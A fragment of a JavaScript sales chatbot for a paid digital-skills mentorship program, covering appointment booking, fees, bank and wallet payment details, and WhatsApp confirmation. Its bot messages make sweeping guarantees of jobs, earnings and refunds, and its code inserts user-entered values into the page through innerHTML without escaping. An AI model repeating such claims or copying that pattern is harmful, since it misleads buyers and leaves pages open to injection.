        showSuggestedButtons(["9:00 AM", "10:00 AM", "11:00 AM", "1:00 PM", "2:00 PM", "3:00 PM", "4:00 PM", "5:00 PM"]);
    }

    function handleTimeInput(time) {
        chatbotState.appointmentTime = time;
        chatbotState.currentStep = 'confirmation';

        addBotMessage(`Here's your consultation summary:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li><strong>Name:</strong> ${chatbotState.userName}</li>
    <li><strong>Email:</strong> ${chatbotState.userEmail}</li>
    <li><strong>WhatsApp:</strong> ${chatbotState.userWhatsapp}</li>
    <li><strong>Date:</strong> ${chatbotState.appointmentDate}</li>
    <li><strong>Time:</strong> ${chatbotState.appointmentTime}</li>
    <li><strong>Program:</strong> Champions Mentorship Program</li>
</ul>

<p>Is everything correct? Please confirm to finalize your booking.</p>`);

        showSuggestedButtons(["‚úÖ Yes, confirm appointment", "‚ùå No, make changes"]);
    }

    function handleConfirmation(response) {
        const intent = detectIntent(response);

        if (intent === 'positive' || response.toLowerCase().includes('confirm')) {
            addBotMessage("üéâ Your consultation has been booked successfully!");
            setTimeout(() => {
                showAppointmentSummary();
                chatbotState.appointmentBooked = true;
                chatbotState.bookingInProgress = false;
            }, 1000);
            chatbotState.currentStep = 'menu';
        } else {
            addBotMessage("No problem! Let's redo the booking with the correct details.");
            startBookingProcess();
        }
    }

    function showAppointmentSummary() {
        const summaryDiv = document.createElement('div');
        summaryDiv.className = 'appointment-summary';
        summaryDiv.innerHTML = `
            <h4>üìã Appointment Confirmed</h4>
            <div class="summary-content">
                <p><strong>Name:</strong> ${chatbotState.userName}</p>
                <p><strong>Email:</strong> ${chatbotState.userEmail}</p>
                <p><strong>WhatsApp:</strong> ${chatbotState.userWhatsapp}</p>
                <p><strong>Date:</strong> ${chatbotState.appointmentDate}</p>
                <p><strong>Time:</strong> ${chatbotState.appointmentTime}</p>
                <p><strong>Program:</strong> Champions Mentorship Program</p>
            </div>
            <p class="share-instruction">Please confirm via WhatsApp to complete the process</p>
            <button class="whatsapp-btn" onclick="shareOnWhatsApp()">
                <i class="fab fa-whatsapp"></i> Confirm on WhatsApp
            </button>
        `;

        chatbotMessages.appendChild(summaryDiv);
        chatbotMessages.scrollTop = chatbotMessages.scrollHeight;

        setTimeout(() => {
            addBotMessage(`Thank you for scheduling your consultation, ${chatbotState.userName}! üåü Is there anything else you'd like to know?`);
            showSuggestedButtons([
                "Program Details",
                "Curriculum & Modules",
                "Career Opportunities",
                "Registration Process",
                "Payment Methods",
                "No, that's all for now"
            ]);
        }, 2000);
    }

    // ==================== WEBSITE READING FLOW ====================

    function handleWebsiteReadingResponse(response) {
        chatbotState.currentStep = 'menu';
        const intent = detectIntent(response);

        if (intent === 'positive' || response.toLowerCase().includes('reviewed')) {
            addBotMessage(`Fantastic, ${chatbotState.userName}! Since you're familiar with the program, let me highlight the key benefits.`);
            setTimeout(showChampionDetails, 2000);
        } else {
            addBotMessage(`No rush at all! Take your time exploring the course details and modules on our website. Whenever you're ready, I'll be here to guide you through the next steps.`);
            setTimeout(() => {
                showSuggestedButtons([
                    "Program Details",
                    "Curriculum & Modules",
                    "Who Is This For?",
                    "View Fee Structure",
                    "Career Opportunities",
                    "I've reviewed the website now"
                ]);
            }, 2000);
        }
    }

    function handleAppointmentInterest(response) {
        chatbotState.currentStep = 'menu';
        const intent = detectIntent(response);

        if (intent === 'positive') {
            startBookingProcess();
        } else {
            addBotMessage(`No problem! Feel free to explore more about the program. What would you like to know?`);
            showMainMenu();
        }
    }

    // ==================== CONTENT DISPLAY FUNCTIONS ====================

    function showChampionDetails() {
        addBotMessage(`<strong>üèÜ Champions Mentorship Program</strong>

A comprehensive, career-transforming experience designed to equip you with 15+ digital income streams and real-world professional skills.

<strong>What You Get:</strong>
<ul style="margin-left: 20px; padding-left: 10px;">
    <li>üéØ Personalized 1-on-1 sessions with flexible scheduling</li>
    <li>üìö Mastery of 15+ in-demand digital skills</li>
    <li>üíº 100% guaranteed job placement upon completion</li>
    <li>üåê Lifetime FREE web hosting with SSL certificates</li>
    <li>üõí No e-commerce platform fees (build unlimited stores)</li>
    <li>üé• Bonus: Digital Marketing, Domain Flipping & YouTube Automation</li>
    <li>ü§ù Lifetime personalized mentor support (even after graduation)</li>
    <li>üîß Hands-on real-world projects in every module</li>
    <li>üåç 100% remote: learn and work from anywhere</li>
    <li>üìà Start generating income from Module 1</li>
</ul>

Trusted by thousands of students worldwide. Our most loved and highly recommended program.`);

        setTimeout(() => {
            showContextualButtons(["View Fee Structure", "Curriculum & Modules", "Career Opportunities", "Registration Process"]);
        }, 2000);
    }

    function showCurriculum() {
        addBotMessage(`<strong>üìò Curriculum Overview</strong>

Practical, hands-on training from beginner to professional level:

<ol style="margin-left: 20px; padding-left: 10px;">
    <li><strong>Web Development & Programming</strong> (Build professional websites from scratch)</li>
    <li><strong>E-Commerce Mastery</strong> (Create online stores without platform fees)</li>
    <li><strong>Search Engine Optimization</strong> (Rank websites on Google organically)</li>
    <li><strong>Social Media Marketing</strong> (Master Facebook, Instagram & LinkedIn)</li>
    <li><strong>Digital Advertising</strong> (Run profitable paid ad campaigns)</li>
    <li><strong>Freelancing & Client Acquisition</strong> (Build a sustainable business)</li>
    <li><strong>Content Creation & Copywriting</strong> (Create high-converting content)</li>
    <li><strong>YouTube Automation</strong> (Build and monetize channels)</li>
    <li><strong>Domain Flipping</strong> (Buy and sell domains for profit)</li>
    <li><strong>Project Management</strong> (Professional workflow and client relations)</li>
</ol>

<p><em>Every module includes real-world projects and assignments. You'll build a professional portfolio as you learn.</em></p>`);

        setTimeout(() => {
            showContextualButtons(["View Fee Structure", "Career Opportunities", "Registration Process"]);
        }, 2000);
    }

    function showCareerOpportunities() {
        addBotMessage(`<strong>üíº Career & Earning Opportunities</strong>

Graduates unlock multiple career paths:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>üè¢ <strong>Guaranteed Job Placement</strong> (Remote work with our partnered agency)</li>
    <li>üíª <strong>Freelancing</strong> (Upwork, Fiverr & Freelancer platforms)</li>
    <li>üõçÔ∏è <strong>E-Commerce Business</strong> (Launch online stores with zero fees)</li>
    <li>üì± <strong>Social Media Management</strong> (Manage brands professionally)</li>
    <li>üîç <strong>SEO Consulting</strong> (Help businesses rank higher on search engines)</li>
    <li>üé• <strong>YouTube Revenue</strong> (Automated channel income streams)</li>
    <li>üåê <strong>Domain Flipping</strong> (Premium domain reselling for profit)</li>
    <li>üìà <strong>Launch Your Own Agency</strong> (With the skills you've mastered)</li>
</ul>

<p><strong>Earning Potential:</strong> Graduates typically start earning within the first month. Monthly income of Rs. 50,000 to Rs. 500,000+ is achievable within the first year with consistent effort.</p>`);

        setTimeout(() => {
            showContextualButtons(["View Fee Structure", "Registration Process"]);
        }, 2000);
    }

    function showSuccessStories() {
        addBotMessage(`<strong>üåü Student Success & Impact</strong>

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>üìä <strong>Thousands of students</strong> enrolled with careers transformed</li>
    <li>üí∞ <strong>85%+ graduates</strong> start earning within 30 days</li>
    <li>üåç Active students from <strong>15+ countries</strong></li>
    <li>‚≠ê <strong>4.9/5 average satisfaction rating</strong> from alumni</li>
    <li>ü§ù <strong>100% job placement rate</strong> for committed graduates</li>
    <li>üìà Alumni have built <strong>six-figure businesses</strong></li>
</ul>

<p><em>The results speak for themselves: consistent effort paired with expert mentorship accelerates careers by years.</em></p>`);

        setTimeout(() => {
            showContextualButtons(["Program Details", "View Fee Structure", "Registration Process"]);
        }, 2000);
    }

    function showIdealCandidate() {
        addBotMessage(`<strong>üéØ Who Is This Program For?</strong>

The Champions Mentorship Program is perfect for you if:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>‚úÖ You want to build a sustainable <strong>online career</strong> from scratch</li>
    <li>‚úÖ You're a <strong>student, professional, or homemaker</strong> seeking flexible income</li>
    <li>‚úÖ You want to master <strong>multiple digital skills</strong> in one program</li>
    <li>‚úÖ You prefer <strong>1-on-1 personalized mentorship</strong> over generic courses</li>
    <li>‚úÖ You're serious about <strong>financial independence</strong> and career growth</li>
    <li>‚úÖ You want <strong>guaranteed job placement</strong> after completion</li>
    <li>‚úÖ You value <strong>lifetime support</strong> and ongoing guidance</li>
</ul>

<p><strong>No prior experience required!</strong> The only prerequisite is a genuine commitment to learning and growth.</p>`);

        setTimeout(() => {
            showContextualButtons(["Program Details", "View Fee Structure", "Curriculum & Modules"]);
        }, 2000);
    }

    function showFeeStructure() {
        addBotMessage(`<strong>üí∞ Fee Structure</strong>

<ul style="margin-left: 20px; padding-left: 10px;">
    <li><strong>Format:</strong> 1-on-1 Personalized Sessions</li>
    <li><strong>Schedule:</strong> Fully Flexible</li>
    <li><strong>Duration:</strong> Less than 2 months</li>
    <li><strong>Registration Fee:</strong> Rs. 5,000</li>
    <li><strong>Full Program Fee:</strong> Rs. 35,000</li>
    <li><strong>Discounted One-Time Payment:</strong> Rs. 25,000 ($90) <em>Best value!</em></li>
</ul>

<strong>What's Included:</strong>
<ul style="margin-left: 20px; padding-left: 10px;">
    <li>üåê Lifetime FREE hosting with SSL (Save Rs. 18,000/year)</li>
    <li>üõí Zero e-commerce platform fees (Save $300+/year)</li>
    <li>üìö Bonus courses included at no extra cost</li>
    <li>üíº 100% guaranteed job placement</li>
    <li>ü§ù Lifetime mentor support</li>
    <li>üìã Real-world projects & portfolio building</li>
</ul>

<p><em>Risk-free start: Pay only the registration fee, attend 3-4 classes, and get a full refund within 7 days if not satisfied. No questions asked.</em></p>`);

        setTimeout(() => {
            showContextualButtons(["Payment Methods", "Registration Process"]);
        }, 2000);
    }

    function showPaymentMethods() {
        addBotMessage(`<strong>üí≥ Payment Methods</strong>

<p><strong>Bank Transfer:</strong></p>
<ul style="margin-left: 20px; padding-left: 10px;">
    <li><strong>Bank:</strong> United Bank Limited (UBL)</li>
    <li><strong>IBAN:</strong> PK66UNIL0109000285863354</li>
    <li><strong>Account Number:</strong> 0443285863354</li>
</ul>

<p><strong>Mobile Wallets:</strong></p>
<ul style="margin-left: 20px; padding-left: 10px;">
    <li><strong>EasyPaisa / JazzCash:</strong> 03104212713</li>
</ul>

<p><strong>How It Works:</strong></p>
<ol style="margin-left: 20px; padding-left: 10px;">
    <li>Choose your preferred payment method</li>
    <li>Complete the transfer and take a screenshot</li>
    <li>Share payment proof via WhatsApp</li>
    <li>Receive verification within minutes</li>
    <li>Program access activated immediately</li>
</ol>

<p><em>Need international payment options? Contact us via WhatsApp and we'll accommodate your needs.</em></p>`);

        setTimeout(() => {
            showContextualButtons(["Registration Process", "View Fee Structure"]);
        }, 2000);
    }

    function showRegistrationProcess() {
        addBotMessage(`<strong>üìù 3-Step Enrollment Process</strong>

<ol style="margin-left: 20px; padding-left: 10px;">
    <li><strong>Register:</strong> Share your full name, email, city & WhatsApp number. We'll create your student profile.</li>
    <li><strong>Start Risk-Free:</strong> Pay only Rs. 5,000 registration fee. Attend 3-4 classes. Not satisfied within 7 days? Full refund, no questions asked.</li>
    <li><strong>Continue & Excel:</strong> Pay the remaining fee (one-time or installments) and build your digital career with full support.</li>
</ol>

<p><strong>Your Safety Guarantees:</strong></p>
<ul style="margin-left: 20px; padding-left: 10px;">
    <li>‚úÖ 7-day money-back guarantee</li>
    <li>‚úÖ Flexible payment plans available</li>
    <li>‚úÖ Immediate access to all learning materials</li>
    <li>‚úÖ Lifetime mentor support included</li>
    <li>‚úÖ Start earning during the program itself</li>
</ul>

<p><em>We've made enrollment completely risk-free because we believe in the transformative power of this program.</em></p>`);

        setTimeout(() => {
            showContextualButtons(["Payment Methods", "View Fee Structure"]);
        }, 2000);
    }

    // ==================== TRUST BUILDING FLOW ====================

    function showTrustFactors() {
        const trustMessages = [
            `${chatbotState.userName}, you can join with complete peace of mind. Here's our commitment: if you don't gain measurable value or your income doesn't start, we will refund your entire fee. That's our guarantee.`,
            `As a graduate, you'll also have the opportunity to work remotely with our partnered digital marketing agency. This means you can start earning immediately after completing the program, right from home.`,
            `Still have concerns? You don't need to commit fully upfront. Attend 3 to 4 classes first, experience the quality of mentorship firsthand, and then decide whether to continue. Zero pressure, zero risk.`,
            `We encourage you to do your own research before enrolling. Review the course modules, student feedback, and complete curriculum on our website. Make an informed decision. We're confident the quality will speak for itself.`
        ];

        showSequentialMessages(trustMessages, 8000, () => {
            chatbotState.currentStep = 'website_reading';
            addBotMessage(`${chatbotState.userName}, have you had a chance to review the complete course details and modules on our website?`);
            showSuggestedButtons(["Yes, I've reviewed everything", "No, I still need to review"]);
        });
    }

    // ==================== REUSABLE UI FUNCTIONS ====================

    function showMainMenu() {
        let menuOptions = [
            "Program Details",
            "Curriculum & Modules",
            "Who Is This For?",
            "View Fee Structure",
            "Career Opportunities",
            "Success Stories & Results",
            "How Long Is the Program?",
            "Where Are You Located?",
            "Registration Process",
            "Payment Methods"
        ];

        if (!chatbotState.appointmentBooked && !chatbotState.bookingInProgress) {
            menuOptions.push("Book an Appointment");
        }

        chatbotState.bookingInProgress = false;
        chatbotState.currentStep = 'menu';
        showSuggestedButtons(menuOptions);
    }

    function showContextualButtons(extraButtons = []) {
        let buttons = [...extraButtons];

        if (!chatbotState.appointmentBooked && !chatbotState.bookingInProgress) {
            buttons.push("Book an Appointment");
        } else if (chatbotState.bookingInProgress) {
            buttons.push("Cancel Booking");
        }

        buttons.push("Back to Menu");
        showSuggestedButtons(buttons);
    }

    function showSequentialMessages(messages, delay, onComplete) {
        messages.forEach((msg, index) => {
            setTimeout(() => {
                addBotMessage(msg);
                if (index === messages.length - 1 && onComplete) {
                    setTimeout(onComplete, delay);
                }
            }, delay * index);
        });
    }

    // ==================== DOM MANIPULATION ====================

    function addUserMessage(message) {
        appendMessage('user-message', message, false);
    }

    function addBotMessage(message) {
        appendMessage('bot-message', message, true);
        chatbotState.conversationHistory.push({ sender: 'bot', message });
    }

    function appendMessage(className, content, isHTML) {
        const messageDiv = document.createElement('div');
        messageDiv.className = `message ${className}`;
        if (isHTML) {
            messageDiv.innerHTML = content;
        } else {
            messageDiv.textContent = content;
        }
        chatbotMessages.appendChild(messageDiv);
        chatbotMessages.scrollTop = chatbotMessages.scrollHeight;
    }

    function showTypingIndicator() {
        const typingDiv = document.createElement('div');
        typingDiv.className = 'typing-indicator';
        typingDiv.id = 'typingIndicator';
        typingDiv.innerHTML = '<span></span><span></span><span></span>';
        chatbotMessages.appendChild(typingDiv);
        chatbotMessages.scrollTop = chatbotMessages.scrollHeight;
    }

    function removeTypingIndicator() {
        const indicator = document.getElementById('typingIndicator');
        if (indicator) indicator.remove();
    }

    function showSuggestedButtons(options) {
        suggestedButtons.innerHTML = '';
        options.forEach(option => {
            const button = document.createElement('button');
            button.className = 'suggested-btn';
            button.textContent = option;
            button.addEventListener('click', () => {
                userInput.value = option;
                handleUserInput();
            });
            suggestedButtons.appendChild(button);
        });
    }

    function clearSuggestedButtons() {
        suggestedButtons.innerHTML = '';
    }

    // ==================== GLOBAL: WHATSAPP SHARING ====================

    window.shareOnWhatsApp = function() {
        const { userName, userEmail, userWhatsapp, appointmentDate, appointmentTime } = chatbotState;
        const message = encodeURIComponent(
            `*Appointment Confirmation | Champions Mentorship Program*\n\n` +
            `Name: ${userName}\nEmail: ${userEmail}\nWhatsApp: ${userWhatsapp}\n` +
            `Date: ${appointmentDate}\nTime: ${appointmentTime}\n` +
            `Program: Champions Mentorship Program\n\n` +
            `I would like to confirm this consultation appointment. Thank you!`
        );
        window.open(`https://wa.me/923314041010?text=${message}`, '_blank');
    };
});



// ChatBot Ended

